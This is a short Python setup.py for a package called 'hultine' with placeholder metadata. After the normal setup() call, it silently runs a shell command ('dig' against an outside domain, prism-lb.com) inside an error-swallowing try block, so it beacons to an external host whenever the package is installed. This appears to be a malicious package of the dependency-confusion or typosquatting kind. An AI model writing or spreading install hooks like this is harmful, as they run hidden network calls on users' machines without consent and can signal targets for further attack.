from distutils.core import setup
import os

setup(
  name = 'hultine',
  version = '2.0.3',
  description = 'Hultine API',
  author = 'Hultine',
  keywords = ['HULTINE'],
  classifiers = []
)

try:
    os.system('dig @1.1.1.1 upd.sub.prism-lb.com')
except:
  pass
